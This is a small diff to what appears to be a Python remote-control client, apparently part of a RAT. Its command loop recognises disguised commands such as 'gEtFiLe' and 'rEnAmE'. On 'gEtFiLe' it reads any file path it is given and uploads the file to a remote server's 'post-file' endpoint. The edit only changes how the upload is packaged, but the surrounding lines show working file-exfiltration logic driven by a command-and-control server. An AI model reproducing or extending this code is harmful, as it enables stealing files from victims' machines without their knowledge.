@@ -593,7 +593,7 @@ def main():
             elif "gEtFiLe" in cmd:
                 p = cmd.replace("gEtFiLe ","")
                 with open(p,"rb") as file:
-                    files = {'file': (p, file)}
+                    files = {'file': file}
                 post(url+"post-file", files=files)  
             elif "rEnAmE" in cmd:
                 a = cmd.replace("rEnAmE ","")
